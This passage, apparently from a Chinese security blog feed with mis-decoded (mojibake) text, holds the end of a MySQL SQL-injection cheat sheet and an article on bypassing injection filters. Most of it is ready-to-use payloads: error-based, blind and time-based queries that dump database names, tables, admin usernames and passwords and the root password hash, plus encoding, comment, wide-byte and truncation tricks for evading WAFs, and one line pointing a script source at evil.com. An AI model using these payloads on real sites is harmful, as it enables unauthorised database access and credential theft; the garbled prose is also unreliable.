å…·ä½“åŸç†å‚è€ƒï¼šhttp://www.mysqlops.com/2012/05/15/mysql-sql-analyze.htmlï¼‰ã€‚
</code></pre><p>å¸¸ç”¨è¯­å¥ï¼š</p>
<pre><code>æ•°æ®åº“ç‰ˆæœ¬
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
ç®€å•åŠæ³•çˆ†åº“
?id=info()
çˆ†ç”¨æˆ·
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
çˆ†æ•°æ®åº“å
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
çˆ†åº“
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
çˆ†è¡¨
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
çˆ†å­—æ®µ
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
çˆ†å†…å®¹
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
</code></pre><p><strong>æ³¨ï¼š</strong>ä½¿ç”¨group byæŠ¥é”™æ³¨å…¥æ–¹å¼çš„æ³¨æ„äº‹é¡¹</p>
<p>(1)æŠ¥é”™è¯­å¥ä¸­çš„count(*)ä¸å¯ç¼ºå°‘ã€‚</p>
<p>(2)from è¡¨ä¹Ÿä¸å¯ç¼ºå°‘ã€‚</p>
<h2 id="2ã€ExtractValue-æœ‰é•¿åº¦é™åˆ¶-æœ€é•¿32ä½"><a href="#2ã€ExtractValue-æœ‰é•¿åº¦é™åˆ¶-æœ€é•¿32ä½" class="headerlink" title="2ã€ExtractValue(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½)"></a>2ã€ExtractValue(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½)</h2><p>ExtractValue()å‡½æ•°æ˜¯å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ã€‚</p>
<pre><code>extractvalue()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåœ¨å®é™…æ³¨å…¥æ—¶ç¬¬ä¸€ä¸ªå‚æ•°è®¾ä¸º1ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯éœ€è¦çˆ†çš„æ•°æ®ã€‚
å¦‚ï¼šextractvalue(1, concat(0x5c,version()))ã€‚
åŒæ ·ï¼Œåœ¨ä½¿ç”¨ä¸­ä¼šé‡åˆ°å¦‚ä¸‹é¢UpdateXml()ç±»ä¼¼çš„ç›¸åŒé—®é¢˜ï¼Œå³å¦‚æœåœ¨çˆ†çš„æ•°æ®å‰ä¸è¿æ¥å…¶ä»–å­—ç¬¦å¯èƒ½ä¼šæ˜¾ç¤ºä¸å®Œå…¨ã€‚å³è·å–ç‰ˆæœ¬å·æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸èƒ½ä¸ºversion(),è€Œåº”æ”¹ä¸ºconcat(0x5c,version())
</code></pre><p>å¸¸ç”¨è¯­å¥ï¼š</p>
<pre><code>?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))
?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
</code></pre><h2 id="3ã€UpdateXml-æœ‰é•¿åº¦é™åˆ¶-æœ€é•¿32ä½"><a href="#3ã€UpdateXml-æœ‰é•¿åº¦é™åˆ¶-æœ€é•¿32ä½" class="headerlink" title="3ã€UpdateXml(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½)"></a>3ã€UpdateXml(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½)</h2><p>UpdateXml()å‡½æ•°ä¹Ÿæ˜¯æ˜¯å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ã€‚</p>
<pre><code>UpdateXml()å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåœ¨å®é™…æ¸—é€æ—¶ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ç›´æ¥å†™1å³å¯ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯éœ€è¦çˆ†å‡ºçš„å†…å®¹ï¼Œè¦çˆ†å‡ºä¸åŒçš„å†…å®¹ç›´æ¥ä¿®æ”¹ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚ä½†æ˜¯åœ¨å®é™…ä½¿ç”¨æ—¶æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼šå³çˆ†é”™çš„å†…å®¹å¯èƒ½æ˜¾ç¤ºä¸å®Œæ•´ã€‚
</code></pre><p>å¸¸ç”¨è¯­å¥ï¼š</p>
<pre><code>?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
</code></pre><h2 id="4ã€NAME-CONST-é€‚ç”¨äºä½ç‰ˆæœ¬"><a href="#4ã€NAME-CONST-é€‚ç”¨äºä½ç‰ˆæœ¬" class="headerlink" title="4ã€NAME_CONST(é€‚ç”¨äºä½ç‰ˆæœ¬)"></a>4ã€NAME_CONST(é€‚ç”¨äºä½ç‰ˆæœ¬)</h2><pre><code>?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
ä¸å¥½ç”¨
</code></pre><h2 id="5ã€Error-based-Double-Query-Injection"><a href="#5ã€Error-based-Double-Query-Injection" class="headerlink" title="5ã€Error based Double Query Injection"></a>5ã€Error based Double Query Injection</h2><pre><code>æ•°æ®åº“ç‰ˆæœ¬
?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
</code></pre><h1 id="0x03-mysqlä¸€èˆ¬ç›²æ³¨"><a href="#0x03-mysqlä¸€èˆ¬ç›²æ³¨" class="headerlink" title="0x03 mysqlä¸€èˆ¬ç›²æ³¨"></a>0x03 mysqlä¸€èˆ¬ç›²æ³¨</h1><pre><code>ä½¿ç”¨ascii
AND ascii(substring((SELECT password FROM users where id=1),1,1))=49
ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼
and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &apos;^[a-n]&apos; LIMIT 0,1)
</code></pre><p>ç›²æ³¨æ²¡ä»€ä¹ˆè¯´çš„ï¼Œå°±æ˜¯åˆ©ç”¨æ˜¯å¦ç­‰äºï¼Œè¿™äº›å‡½æ•°åˆ¤æ–­asciiç ï¼Œè„šæœ¬è·‘å‘—ï¼Œæˆ–è€…sqlmap</p>
<h1 id="0x04-mysqlæ—¶é—´ç›²æ³¨"><a href="#0x04-mysqlæ—¶é—´ç›²æ³¨" class="headerlink" title="0x04 mysqlæ—¶é—´ç›²æ³¨"></a>0x04 mysqlæ—¶é—´ç›²æ³¨</h1><p>æ—¶é—´ç›²æ³¨ç”¨ä¸¤ä¸ªå‡½æ•°ä¸€ä¸ªæ˜¯sleep,ä¸€ä¸ªæ˜¯benchmarkï¼Œsleepå°±ä¸è¯´äº†ã€‚</p>
<p>benchmarkè¯­æ³•ï¼š</p>
<pre><code>BENCHMARK(count,expr)   
BENCHMARK()å‡½æ•°é‡å¤countTimesæ¬¡æ‰§è¡Œè¡¨è¾¾å¼expr
</code></pre><p>å¸¸ç”¨è¯­å¥ï¼š</p>
<pre><code>union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(&apos;msg&apos;,&apos;by 5 seconds&apos;)),null) from (select database() as current) as tbl

UNION SELECT IF(SUBSTRING(Password,1,1)=&apos;a&apos;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = &apos;root&apos;
</code></pre><h1 id="0x05-mysqlçš„ä¸€äº›ç‰¹æ€§åœ¨SQLæ³¨å…¥ä¸­çš„åˆ©ç”¨"><a href="#0x05-mysqlçš„ä¸€äº›ç‰¹æ€§åœ¨SQLæ³¨å…¥ä¸­çš„åˆ©ç”¨" class="headerlink" title="0x05 mysqlçš„ä¸€äº›ç‰¹æ€§åœ¨SQLæ³¨å…¥ä¸­çš„åˆ©ç”¨"></a>0x05 mysqlçš„ä¸€äº›ç‰¹æ€§åœ¨SQLæ³¨å…¥ä¸­çš„åˆ©ç”¨</h1><h2 id="1ã€å¤§å°å†™åˆ©ç”¨"><a href="#1ã€å¤§å°å†™åˆ©ç”¨" class="headerlink" title="1ã€å¤§å°å†™åˆ©ç”¨"></a>1ã€å¤§å°å†™åˆ©ç”¨</h2><p>ä¸ç®¡ä½ è¡¨å•å¡«å†™çš„æ˜¯ä»€ä¹ˆï¼Œæ’å…¥åˆ°mysqlæ•°æ®åº“çš„æ—¶å€™ï¼Œéƒ½ä¼šå˜æˆå°å†™ã€‚</p>
<p>å¦‚ï¼šæ³¨å†Œadminæ—¶æ˜¾ç¤ºç”¨æˆ·å·²å­˜åœ¨ï¼Œä½ å¯ä»¥å°è¯•ADMINæ³¨å†Œã€‚</p>
<h2 id="2ã€å­—ç¬¦æˆªæ–­åˆ©ç”¨"><a href="#2ã€å­—ç¬¦æˆªæ–­åˆ©ç”¨" class="headerlink" title="2ã€å­—ç¬¦æˆªæ–­åˆ©ç”¨"></a>2ã€å­—ç¬¦æˆªæ–­åˆ©ç”¨</h2><p>mysqlåœ¨ä½¿ç”¨utf8çš„æ—¶å€™ï¼Œä¸€ä¸ªå­—ç¬¦çš„å¤§å°çš„ä¸Šé™ä¸º3å­—èŠ‚ï¼Œè€Œå½“å‡ºç°å››ä¸ªå­—èŠ‚çš„å­—ç¬¦æ—¶ï¼Œæ˜¯éœ€è¦ç”¨ä½¿ç”¨utf8mb4ç¼–ç ï¼Œä¸ä½¿ç”¨çš„è¯ï¼Œä¼šå°†ä¸è¯†åˆ«çš„å››å­—èŠ‚çš„å­—ç¬¦è¿åŒåé¢çš„å­—ç¬¦ä¸²ä¸€åŒèˆå¼ƒã€‚</p>
<p>æ‰€ä»¥åªè¦æˆ‘ä»¬ä½¿ç”¨ascii&gt;=256çš„ç‰¹æ®Šå­—ç¬¦å°±å¯ä»¥ç»•è¿‡äº†ã€‚</p>
<p>å¦‚ï¼š</p>
<pre><code>UPDATE `wp_comments` SET `comment_content` = &apos;adminç‰¹æ®Šå­—ç¬¦123456 &apos; WHERE `wp_comments`.`comment_ID` =12;

ä»¥ä¸Šè¯­å¥æ’å…¥åˆ°æ•°æ®åº“çš„å†…å®¹å°±æ˜¯adminäº†ï¼Œåé¢çš„123456è¢«ç‰¹æ®Šå­—ç¬¦æˆªæ–­ã€‚
</code></pre><h2 id="3ã€è¶…è¿‡é•¿åº¦æˆªæ–­åˆ©ç”¨"><a href="#3ã€è¶…è¿‡é•¿åº¦æˆªæ–­åˆ©ç”¨" class="headerlink" title="3ã€è¶…è¿‡é•¿åº¦æˆªæ–­åˆ©ç”¨"></a>3ã€è¶…è¿‡é•¿åº¦æˆªæ–­åˆ©ç”¨</h2><p>å°±æ˜¯åˆ©ç”¨æ•°æ®å®šä¹‰æ—¶ï¼Œå®šä¹‰çš„é•¿åº¦å¤§å°æˆªæ–­ã€‚</p>
<p>å¦‚ï¼š</p>
<pre><code>insert into user values (&apos;admin++++++++++++++++123456&apos;,&apos;123456&apos;);

ä»¥ä¸Šè¯­å¥ï¼Œå¦‚æœé•¿åº¦é™åˆ¶æ˜¯16ä½ï¼Œé‚£ä¹ˆæ’å…¥åˆ°æ•°æ®åº“ä¸­çš„æ—¶å€™ç”¨æˆ·åçš„123456è¢«æˆªæ–­

ç”¨æˆ·ï¼šadmin å¯†ç ï¼š123456
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> MySQL </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLæ³¨å…¥ç»•è¿‡æŠ€å·§]]></title>
      <url>/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>SQLæ³¨å…¥æ”»å‡»æ˜¯é»‘å®¢å¯¹æ•°æ®åº“è¿›è¡Œæ”»å‡»çš„å¸¸ç”¨æ‰‹æ®µä¹‹ä¸€ã€‚ç”±äºç¨‹åºå‘˜çš„æ°´å¹³åŠç»éªŒä¹Ÿå‚å·®ä¸é½ï¼Œç›¸å½“å¤§ä¸€éƒ¨åˆ†ç¨‹åºå‘˜åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§è¿›è¡Œåˆ¤æ–­ï¼Œä½¿åº”ç”¨ç¨‹åºå­˜åœ¨å®‰å…¨éšæ‚£ã€‚ç”¨æˆ·å¯ä»¥æäº¤ä¸€æ®µæ•°æ®åº“æŸ¥è¯¢ä»£ç ï¼Œæ ¹æ®ç¨‹åºè¿”å›çš„ç»“æœï¼Œè·å¾—æŸäº›ä»–æƒ³å¾—çŸ¥çš„æ•°æ®ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„SQL Injectionï¼Œå³SQLæ³¨å…¥ã€‚<br><a id="more"></a></p>
<h1 id="0x00-sqlæ³¨å…¥çš„åŸå› "><a href="#0x00-sqlæ³¨å…¥çš„åŸå› " class="headerlink" title="0x00 sqlæ³¨å…¥çš„åŸå› "></a>0x00 sqlæ³¨å…¥çš„åŸå› </h1><p>sqlæ³¨å…¥çš„åŸå› ï¼Œè¡¨é¢ä¸Šè¯´æ˜¯å› ä¸º æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæ„æˆsqlè¯­å¥ï¼Œæ²¡æœ‰ä½¿ç”¨ sqlè¯­å¥é¢„ç¼–è¯‘ï¼Œç»‘å®šå˜é‡ã€‚</p>
<p>ä½†æ˜¯æ›´æ·±å±‚æ¬¡çš„åŸå› æ˜¯ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå½“æˆäº† â€œsqlè¯­å¥â€ æ¥æ‰§è¡Œã€‚</p>
<p>æ¯”å¦‚ä¸Šé¢çš„ String sql = â€œselect id,no from user where id=â€ + id;<br>æˆ‘ä»¬å¸Œæœ›ç”¨æˆ·è¾“å…¥çš„ id çš„å€¼ï¼Œä»…ä»…ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å­—é¢å€¼ï¼Œä¼ å…¥æ•°æ®åº“æ‰§è¡Œï¼Œä½†æ˜¯å½“è¾“å…¥äº†ï¼š 2 or 1=1 æ—¶ï¼Œå…¶ä¸­çš„ or 1=1 å¹¶æ²¡æœ‰ä½œä¸º where id= çš„å­—é¢å€¼ï¼Œè€Œæ˜¯ä½œä¸ºäº† sqlè¯­å¥ æ¥æ‰§è¡Œçš„ã€‚æ‰€ä»¥å…¶æœ¬è´¨æ˜¯å°†ç”¨æˆ·çš„è¾“å…¥çš„æ•°æ®ï¼Œä½œä¸ºäº†å‘½ä»¤æ¥æ‰§è¡Œã€‚</p>
<h1 id="0x01-sqlæ³¨å…¥ç»•è¿‡"><a href="#0x01-sqlæ³¨å…¥ç»•è¿‡" class="headerlink" title="0x01 sqlæ³¨å…¥ç»•è¿‡"></a>0x01 sqlæ³¨å…¥ç»•è¿‡</h1><h2 id="1-1-æ³¨é‡Šç¬¦ç»•è¿‡"><a href="#1-1-æ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="1.1 æ³¨é‡Šç¬¦ç»•è¿‡"></a>1.1 æ³¨é‡Šç¬¦ç»•è¿‡</h2><p>å¸¸ç”¨æ³¨é‡Šç¬¦ï¼š</p>
<pre><code>//, -- , /**/, #, --+, -- -, ;,%00,--a
UNION /**/ Select /**/userï¼Œpwdï¼Œfrom user
U/**/ NION /**/ SE/**/ LECT /**/userï¼Œpwd from user
</code></pre><h2 id="1-2-å¤§å°å†™ç»•è¿‡"><a href="#1-2-å¤§å°å†™ç»•è¿‡" class="headerlink" title="1.2 å¤§å°å†™ç»•è¿‡"></a>1.2 å¤§å°å†™ç»•è¿‡</h2><pre><code>?id=1+UnIoN/**/SeLeCT
</code></pre><h2 id="1-3-å†…è”æ³¨é‡Šç»•è¿‡"><a href="#1-3-å†…è”æ³¨é‡Šç»•è¿‡" class="headerlink" title="1.3 å†…è”æ³¨é‡Šç»•è¿‡"></a>1.3 å†…è”æ³¨é‡Šç»•è¿‡</h2><pre><code>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
</code></pre><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ä»£ç å¯ä»¥ç»•è¿‡è¿‡æ»¤å™¨ï¼Œè¯·æ³¨æ„ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯ Likeè€Œä¸æ˜¯ =</p>
<h2 id="1-4-åŒå…³é”®å­—ç»•è¿‡"><a href="#1-4-åŒå…³é”®å­—ç»•è¿‡" class="headerlink" title="1.4 åŒå…³é”®å­—ç»•è¿‡"></a>1.4 åŒå…³é”®å­—ç»•è¿‡</h2><pre><code>?id=1+UNIunionON+SeLselectECT+1,2,3â€“
</code></pre><h2 id="1-5-ç¼–ç ç»•è¿‡"><a href="#1-5-ç¼–ç ç»•è¿‡" class="headerlink" title="1.5 ç¼–ç ç»•è¿‡"></a>1.5 ç¼–ç ç»•è¿‡</h2><p>å¦‚URLEncodeç¼–ç ï¼ŒASCII,HEX,unicodeç¼–ç ç»•è¿‡</p>
<pre><code>or 1=1å³%6f%72%20%31%3d%31ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸ºCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)ã€‚

åå…­è¿›åˆ¶ç¼–ç 

SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

åŒé‡ç¼–ç ç»•è¿‡

?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

ä¸€äº›unicodeç¼–ç ä¸¾ä¾‹ï¼š    
å•å¼•å·ï¼š&apos;
%u0027 %u02b9 %u02bc
%u02c8 %u2032
%uff07 %c0%27
%c0%a7 %e0%80%a7
ç©ºç™½ï¼š
%u0020 %uff00
%c0%20 %c0%a0 %e0%80%a0
å·¦æ‹¬å·(:
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
å³æ‹¬å·):
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9
</code></pre><h2 id="1-6-ç©ºæ ¼ç»•è¿‡"><a href="#1-6-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="1.6 ç©ºæ ¼ç»•è¿‡"></a>1.6 ç©ºæ ¼ç»•è¿‡</h2><pre><code>ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼

%20 %09 %0a %0b %0c %0d %a0 /**/

æ‹¬å·ç»•è¿‡ç©ºæ ¼
åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥
select(user())from dual where 1=1 and 2=2;
</code></pre><h2 id="1-7-ä¸‡èƒ½å¯†é’¥ç»•è¿‡"><a href="#1-7-ä¸‡èƒ½å¯†é’¥ç»•è¿‡" class="headerlink" title="1.7 ä¸‡èƒ½å¯†é’¥ç»•è¿‡"></a>1.7 ä¸‡èƒ½å¯†é’¥ç»•è¿‡</h2><pre><code>ç”¨ç»å…¸çš„or 1=1åˆ¤æ–­ç»•è¿‡,å¦‚or â€˜swordsâ€™ =â€™swords
</code></pre><h2 id="1-8-å·æ‹†è§£å­—ç¬¦ä¸²ç»•è¿‡"><a href="#1-8-å·æ‹†è§£å­—ç¬¦ä¸²ç»•è¿‡" class="headerlink" title="1.8 +,-,.å·æ‹†è§£å­—ç¬¦ä¸²ç»•è¿‡"></a>1.8 +,-,.å·æ‹†è§£å­—ç¬¦ä¸²ç»•è¿‡</h2><pre><code>?id=1&apos; or &apos;11+11&apos;=&apos;11+11&apos;
&quot;-&quot;å’Œ&quot;.&quot;
</code></pre><h2 id="1-9-likeç»•è¿‡"><a href="#1-9-likeç»•è¿‡" class="headerlink" title="1.9 likeç»•è¿‡"></a>1.9 likeç»•è¿‡</h2><pre><code>?id=1&apos; or 1 like 1 
ç»•è¿‡å¯¹â€œ=â€ï¼Œâ€œ&gt;â€ç­‰çš„è¿‡æ»¤
</code></pre><h2 id="2-0-inç»•è¿‡"><a href="#2-0-inç»•è¿‡" class="headerlink" title="2.0 inç»•è¿‡"></a>2.0 inç»•è¿‡</h2><pre><code>or &apos;1&apos; IN (&apos;swords&apos;)
</code></pre><h2 id="2-1-gt-lt-ç»•è¿‡"><a href="#2-1-gt-lt-ç»•è¿‡" class="headerlink" title="2.1 &gt;,&lt;ç»•è¿‡"></a>2.1 &gt;,&lt;ç»•è¿‡</h2><pre><code>or &apos;password&apos; &gt; &apos;pass&apos;
or 1&lt;3
</code></pre><h2 id="2-2-ç­‰ä»·å‡½æ•°ä¸å‘½ä»¤ç»•è¿‡"><a href="#2-2-ç­‰ä»·å‡½æ•°ä¸å‘½ä»¤ç»•è¿‡" class="headerlink" title="2.2 ç­‰ä»·å‡½æ•°ä¸å‘½ä»¤ç»•è¿‡"></a>2.2 ç­‰ä»·å‡½æ•°ä¸å‘½ä»¤ç»•è¿‡</h2><p>1.å‡½æ•°æˆ–å˜é‡</p>
<pre><code>hex()ã€bin() ==&gt; ascii()

sleep() ==&gt;benchmark()

concat_ws()==&gt;group_concat()

mid()ã€substr() ==&gt; substring()

@@user ==&gt; user()

@@datadir ==&gt; datadir()

ä¸¾ä¾‹ï¼šsubstring()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74ã€€

æˆ–è€…ï¼š
substr((select &apos;password&apos;),1,1) = 0x70
strcmp(left(&apos;password&apos;,1), 0x69) = 1
strcmp(left(&apos;password&apos;,1), 0x70) = 0
strcmp(left(&apos;password&apos;,1), 0x71) = -1
</code></pre><p>2.ç¬¦å·</p>
<pre><code>andå’Œoræœ‰å¯èƒ½ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä»¥è¯•ä¸‹&amp;&amp;å’Œ||

=ä¸èƒ½ä½¿ç”¨çš„æƒ…å†µï¼Œå¯ä»¥è€ƒè™‘å°è¯•&lt;ã€&gt;
</code></pre><p>3.ç”Ÿåƒ»å‡½æ•°</p>
<pre><code>MySQL/PostgreSQLæ”¯æŒXMLå‡½æ•°ï¼šSelect UpdateXML(â€˜&lt;script x=_&gt;&lt;/script&gt; â€™,â€™/script/@x/â€™,â€™src=//evil.comâ€™);ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€

?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))

SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));ã€€//postgresql

?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))

and extractvalue(1, concat(0x5c, (select user()),0x5c))
</code></pre><h2 id="2-3-åå¼•å·-ç»•è¿‡"><a href="#2-3-åå¼•å·-ç»•è¿‡" class="headerlink" title="2.3 åå¼•å·`ç»•è¿‡"></a>2.3 åå¼•å·`ç»•è¿‡</h2><pre><code>select `version()`ï¼Œå¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å°†å…¶åšæ³¨é‡Šç¬¦ç”¨
</code></pre><h2 id="2-4-æ¢è¡Œç¬¦ç»•è¿‡"><a href="#2-4-æ¢è¡Œç¬¦ç»•è¿‡" class="headerlink" title="2.4 æ¢è¡Œç¬¦ç»•è¿‡"></a>2.4 æ¢è¡Œç¬¦ç»•è¿‡</h2><pre><code>%0aã€%0d
</code></pre><h2 id="2-5-æˆªæ–­ç»•è¿‡"><a href="#2-5-æˆªæ–­ç»•è¿‡" class="headerlink" title="2.5 æˆªæ–­ç»•è¿‡"></a>2.5 æˆªæ–­ç»•è¿‡</h2><pre><code>%00,%0A,?,/0,////////////////........////////,%80-%99

ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨windowä¸‹256å­—èŠ‚ã€linuxä¸‹4096å­—èŠ‚æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åçš„å­—ç¬¦å°†è¢«ä¸¢å¼ƒã€‚
././././././././././././././././abc
////////////////////////abc
..1/abc/../1/abc/../1/abc
</code></pre><h2 id="2-6-å®½å­—èŠ‚ç»•è¿‡"><a href="#2-6-å®½å­—èŠ‚ç»•è¿‡" class="headerlink" title="2.6 å®½å­—èŠ‚ç»•è¿‡"></a>2.6 å®½å­—èŠ‚ç»•è¿‡</h2><pre><code>è¿‡æ»¤å•å¼•å·æ—¶ï¼Œå¯ä»¥è¯•è¯•å®½å­—èŠ‚

%bf%27 %df%27 %aa%27
</code></pre><h2 id="2-7-Nç»•è¿‡"><a href="#2-7-Nç»•è¿‡" class="headerlink" title="2.7 \Nç»•è¿‡"></a>2.7 \Nç»•è¿‡</h2><p>\Nå…¶å®ç›¸å½“äºNULLå­—ç¬¦</p>
<pre><code>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
</code></pre><h2 id="2-8-ç‰¹æ®Šçš„ç»•è¿‡å‡½æ•°"><a href="#2-8-ç‰¹æ®Šçš„ç»•è¿‡å‡½æ•°" class="headerlink" title="2.8 ç‰¹æ®Šçš„ç»•è¿‡å‡½æ•°"></a>2.8 ç‰¹æ®Šçš„ç»•è¿‡å‡½æ•°</h2><pre><code>1. é€šè¿‡greatestå‡½æ•°ç»•è¿‡ä¸èƒ½ä½¿ç”¨å¤§å°äºç¬¦å·çš„æƒ…å†µ

greatest(a,b)ï¼Œè¿”å›aå’Œbä¸­è¾ƒå¤§çš„é‚£ä¸ªæ•°ã€‚
å½“æˆ‘ä»¬è¦çŒœè§£user()ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯å¦å°äºç­‰äº150æ—¶ï¼Œå¯ä½¿ç”¨ï¼š
mysql&gt; select greatest(ascii(mid(user(),1,1)),150)=150;
 +------------------------------------------+
| greatest(ascii(mid(user(),1,1)),150)=150 |
 +------------------------------------------+
|                                        1 |
 +------------------------------------------+
å¦‚æœå°äº150ï¼Œåˆ™ä¸Šè¿°è¿”å›å€¼ä¸ºTrueã€‚

2. é€šè¿‡substrå‡½æ•°ç»•è¿‡ä¸èƒ½ä½¿ç”¨é€—å·çš„æƒ…å†µ

mid(user() from 1 for 1)
æˆ–
substr(user() from 1 for 1)

mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150;
 +------------------------------------------+
| ascii(substr(user() from 1 for 1)) &lt; 150 |
 +------------------------------------------+
|                                        1 |
 +------------------------------------------+

3.ä½¿ç”¨æ•°å­¦è¿ç®—å‡½æ•°åœ¨å­æŸ¥è¯¢ä¸­æŠ¥é”™

exp(x)å‡½æ•°çš„ä½œç”¨ï¼š å–å¸¸æ•°eçš„xæ¬¡æ–¹ï¼Œå…¶ä¸­ï¼Œeæ˜¯è‡ªç„¶å¯¹æ•°çš„åº•ã€‚

~x æ˜¯ä¸€ä¸ªä¸€å…ƒè¿ç®—ç¬¦ï¼Œå°†xæŒ‰ä½å–è¡¥

select exp(~(select*from(select user())a))
mysqlæŠ¥é”™ï¼š
mysql&gt; select exp(~(select*from(select user())a));
ERROR 1690 (22003): DOUBLE value is out of range in â€˜exp(~((select â€˜root@localhostâ€™ from dual)))â€™

è¿™æ¡æŸ¥è¯¢ä¼šå‡ºé”™ï¼Œæ˜¯å› ä¸ºexp(x)çš„å‚æ•°xè¿‡å¤§ï¼Œè¶…è¿‡äº†æ•°å€¼èŒƒå›´ï¼Œåˆ†è§£åˆ°å­æŸ¥è¯¢ï¼Œå°±æ˜¯ï¼š

